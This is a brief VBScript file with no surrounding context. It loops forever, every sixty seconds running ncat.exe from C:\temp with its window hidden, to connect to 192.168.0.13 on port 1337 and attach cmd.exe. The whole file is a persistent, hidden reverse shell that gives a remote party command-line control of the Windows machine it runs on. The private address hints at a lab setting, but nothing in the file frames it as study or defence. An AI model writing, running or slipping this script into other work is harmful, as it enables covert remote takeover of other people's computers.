Dim ncShell
Set ncShell = WScript.CreateObject("WScript.shell")

Do while True:
	ncShell.Run "powershell.exe C:\temp\ncat.exe 192.168.0.13 1337 -e cmd.exe", 0, true
	WScript.Sleep(60000)
loop